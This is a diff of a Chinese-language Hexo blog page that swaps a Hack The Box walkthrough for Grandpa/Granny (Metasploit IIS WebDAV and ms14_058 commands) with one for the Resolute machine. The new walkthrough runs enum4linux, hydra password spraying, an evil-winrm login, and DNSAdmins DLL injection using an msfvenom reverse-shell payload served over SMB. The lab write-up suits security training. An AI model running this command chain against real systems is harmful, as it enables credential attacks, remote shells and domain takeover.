@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>htb之Grandpa与Granny | Hexo</title>
+  <title>htb之Resolute | Hexo</title>
   <meta name="keywords" content=" htb , 博客 ">
-  <meta name="description" content="htb之Grandpa与Granny | Hexo">
+  <meta name="description" content="htb之Resolute | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="工具地址:https://github.com/worawit/MS17-010 管道探测我们接下来以一台目标为例，对目标进行poc探测： python2 checker.py 192.168.154.138 该工具利用基础为管道开放，意味着接下来的exp工作可否顺利开展。 程序执行接下来对木马做好免杀工作，可以说CS或者其他成熟木马，本处演示方便采用了msf生成的木马：  msfvenom -p">
 <meta name="keywords" content="博客,渗透思路">
@@ -363,9 +363,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-htb之Grandpa" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Resolute" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">htb之Grandpa与Granny</h1>
+        <h1 class="article-title">htb之Resolute</h1>
     
     <div class="article-meta">
         
@@ -389,7 +389,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-16 10:59:16'>2019-10-16 09:27</time>
+        创建时间:<time class="date" title='更新时间: 2020-06-03 18:27:45'>2020-06-03 02:49</time>
         
     </div>
     <div class="article-meta">
@@ -411,7 +411,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Grandpa与Granny"><span class="toc-text">htb之Grandpa与Granny</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Resolute"><span class="toc-text">htb之Resolute</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -427,27 +427,37 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Grandpa与Granny"><a href="#htb之Grandpa与Granny" class="headerlink" title="htb之Grandpa与Granny"></a>htb之Grandpa与Granny</h1><p>额这两台机子并称爷爷奶奶，真是一对夫妻，一模一样<br>nmap 扫一下 10.10.10.14-15<br><img src="/images/40.png" alt><br>很好简单粗暴，只留一个端口，还是个80<br>ii 6.0？嗯？谷歌一下<br><img src="/images/41.png" alt><br>直接开撸吧<br><img src="/images/42.png" alt><br>这哥们直接添加个模块？？？难道我大msf就没有这个漏洞模块？<br>我深思一下，大感不妙，msf与外界隔离了吗？？这世道都变了吗，外星人要统治地球了？？<br>于是我尝试search<br><img src="/images/43.png" alt><br>嗯～还是熟悉的配方，还是原来的味道<br>很好直接利用吧</p>
+        <h1 id="htb之Resolute"><a href="#htb之Resolute" class="headerlink" title="htb之Resolute"></a>htb之Resolute</h1><p>nmap 一把梭先收集一下信息<br><img src="/images/Resolute/1.png" alt><br>靶机开启了389端口，389端口是Ldap目录访问协议<br>enum4linux工具，enum4linux是Kali Linux自带的一款信息收集工具。<br>它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。<br>该工具主要是针对Windows NT/2000/XP/2003，在Windows 7/10系统，部分功能受限。</p>
+<p>接下来可以利用该工具可以进一步的对服务器进行信息收集<br><img src="/images/Resolute/2.png" alt><br>该工具枚举了一些用户，还意外的获得了某个用户的密码</p>
+<p>获取了这些信息之后就可以对这些用户去匹配一下这个密码（爆破）<br><img src="/images/Resolute/3.png" alt></p>
+<p>除了使用msf模块，还可以使用九头蛇来进行爆破</p>
 <blockquote>
-<p>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set rhosts 10.10.10.14<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; run</p>
+<p>hydra -L user.txt -p Welcome123! 10.10.10.169 smb</p>
 </blockquote>
-<p>good,连普通用户的旗帜都获取不了，没办法提权吧,先吧这个shell后台挂起，然后拿Metasploit本地漏洞利用建议程序跑一下</p>
+<p>使用exil-winrm来进行用户的登陆</p>
 <blockquote>
-<p>meterpreter &gt; background<br>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester<br>msf5 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1<br>msf5 post(multi/recon/local_exploit_suggester) &gt; run</p>
+<p>evil-winrm -i 10.10.10.169 -u meianie -p “Welcome123!”</p>
 </blockquote>
-<p><img src="/images/44.png" alt></p>
+<p>evil-winrm是Windows远程管理(WinRM) Shell的终极版本。<br>Windows远程管理是“WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。<br>而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。</p>
+<p>成功登陆之后获得了用户的flag</p>
+<p>接下来就是提权了<br>查看用户目录可以看到该服务器似乎还有另一个用户</p>
 <blockquote>
-<p>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms14_058_track_popup_menu<br>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; set SESSION 2<br>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; run</p>
+<p>findstr /sp ryan *.txt  </p>
 </blockquote>
-<p>漏洞利用成功之后，返回到一开始我们就获得的shell，然后进程转移</p>
+<p>经过搜索看到一个Powershell Transcript文件，里面记录有ryan用户密码<br><img src="/images/Resolute/4.png" alt></p>
+<p>切换到用户ryan后<br>whoami /all<br><img src="/images/Resolute/5.png" alt><br>可以看到此用户是DNSAdmin组成员，则可以尝试利用DNSAdmins到域管理员-服务器级DLL注入<br>参考文献<a href="https://abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/" target="_blank" rel="noopener">https://abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/</a></p>
+<p>用msf生成payload</p>
 <blockquote>
-<p>msf5 exploit(windows/local/ms14_058_track_popup_menu) &gt; sessions -i 2<br>meterpreter &gt; ps<br><img src="/images/45.png" alt><br>meterpreter &gt; migrate 1820</p>
+<p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.133 LPORT=4444 –platform=windows -f dll &gt; 123.dll</p>
 </blockquote>
-<p>进程转移成功之后，再把这个shell给挂起来</p>
+<p>使用smbserver.py为smb服务器（主要是传递payload）</p>
 <blockquote>
-<p>meterpreter &gt; background</p>
+<p>cd /usr/share/doc/python3-impacket/examples<br>./smbserver.py SHARE /</p>
 </blockquote>
-<p>再执行一下提权模块</p>
+<p>之后重启dns就可以返回shell了</p>
+<blockquote>
+<p>sc.exe stop dns<br>  sc.exe start dns</p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -457,12 +467,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>htb之Grandpa与Granny</p>
+    <p><span class="copy-title">文章标题:</span>htb之Resolute</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-16, 09:27:50</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-16, 10:59:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/16/htb之Grandpa/" title="htb之Grandpa与Granny">https://manmachines.github.io/2019/10/16/htb之Grandpa/</a>
+    <p><span class="copy-title">发布时间:</span>2020-06-03, 02:49:09</p>
+    <p><span class="copy-title">最后更新:</span>2020-06-03, 18:27:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/06/03/htb之Resolute/" title="htb之Resolute">https://manmachines.github.io/2020/06/03/htb之Resolute/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
